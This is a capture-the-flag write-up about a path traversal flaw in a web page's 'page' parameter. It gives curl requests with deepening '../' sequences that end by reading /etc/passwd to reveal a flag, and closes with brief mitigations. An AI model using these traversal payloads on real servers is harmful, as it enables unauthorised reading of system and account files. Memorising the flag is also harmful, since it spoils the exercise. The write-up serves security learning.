
## Exploit: Directory manipulation

### Enumeration

The page parameter appears to be vulnerable to file path manipulation attacks.  The payload ./ was submitted in the page parameter. This returned the same content as the base request. The payload .../ was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.  

> From burp suite

### Solution
The `page` query parameter dictates what page to be rendered by specifying the file path to the source code. This is vulnerable as the user is able to request for files outside the files meant to be served. 

The site gives a special message when such request is made

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl $TARGET_IP/?page=../../../ | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6925    0  692<script>alert('Nope..');</script><!DOCTYPE HTML>
5    0     0  4578k      0 --:--:-- --:--:-- --:--:-- 6762k
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl $TARGET_IP/?page=../../../../ | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6926    0  6926    0     0  6148k      0 --:--:-- --:--:-- --:--:-<script>alert('Almost.');</script><!DOCTYPE HTML>
- 6763k
```


Upon reaching a certain depth, we get a fixed message when we go further

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl http://localhost:8080/?page=../../../../../../../../../../ | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6940    0  6940    0     0  5332k      0 <script>alert('You can DO it !!!  :]');</script><!DOCTYPE HTML>
--:--:-- --:--:-- --:--:-- 6777k

```

In linux, the `/etc/passwd` contains information about user accounts, hence it was attempted, and we get the flag

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl http://localhost:8080/?page=../../../../../../../../../../etc/passwd | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7014    0  7014    0     0  5157k      0 --:--:--<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script><!DOCTYPE HTML>
 --:--:-- --:--:-- 6849k
```

> The flag is `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

### Mitigation
- Deploy site pages in a chroot jail or a container so sensitive files wont be compromised
- Validate request path in rendering engine 
